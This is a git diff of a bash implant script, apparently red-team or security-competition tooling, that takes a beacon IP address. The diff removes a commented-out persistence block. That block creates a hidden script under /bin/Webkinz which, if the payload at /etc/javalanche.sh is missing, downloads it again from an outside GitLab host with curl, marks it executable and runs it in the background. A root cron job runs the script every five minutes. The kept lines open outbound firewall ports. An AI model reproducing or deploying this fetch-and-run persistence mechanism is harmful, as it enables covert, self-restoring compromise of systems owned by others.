@@ -10,33 +10,6 @@ beaconIPAddress="$1"
 
 sleep 60
 
-# Create a backup script to ensure the main payload is downloaded if deleted
-backup_dir="/bin/Webkinz"
-main_payload="/etc/javalanche.sh"
-backup_script="$backup_dir/backup.sh"
-
-# # Ensure the backup directory exists
-# if [ ! -d "$backup_dir" ]; then
-#   sudo mkdir -p "$backup_dir"
-# fi
-
-# # Create the backup script
-# if [ ! -f "$backup_script" ]; then
-#   sudo cat << EOF > "$backup_script"
-# #!/bin/bash
-# if [ ! -f "$main_payload" ]; then
-#   sudo curl -o "$main_payload" "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/linuxPayload.sh?ref_type=heads"
-#   sudo chmod +x "$main_payload"
-#   sudo -b nohup "$main_payload $beaconIPAddress" >/dev/null 2>&1
-# fi
-# EOF
-#   sudo chmod +x "$backup_script"
-# fi
-
-# # Set up a cron job to run the backup script every 5 minutes
-# cronjob="*/5 * * * * root $backup_script"
-# (crontab -l ; echo "\n $cronjob") | crontab -
-
 # Add fiewall rules
 sudo iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT
 sudo iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT
